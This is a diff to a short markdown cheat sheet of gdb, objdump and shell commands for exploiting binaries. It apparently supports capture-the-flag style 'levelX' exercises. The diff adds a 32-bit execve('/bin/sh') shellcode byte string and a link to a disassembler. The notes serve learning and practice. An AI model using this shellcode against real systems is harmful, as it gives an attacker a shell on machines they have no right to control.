@@ -20,6 +20,10 @@ in gdb : `disassemble function_name`
 
 in gdb : ` set disassembly-flavor syntax_name`
 
+## 32-bits shellcode
+
+`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
+
 ## Check system endianness
 
 in shell : `echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6`
@@ -62,3 +66,7 @@ in bash : `scp levelX@vm_ip:/home/user/levelX/levelX levelX`
 ## Display the dynamic relocation entries in the file (PLT and GOT tables)
 
 in bash : `objdump -M intel -R binary`
+
+## Disassemble to ASM instructions
+
+- from hexdump : [inventivehq](https://inventivehq.com/tools/security/machine-code-disassembler)
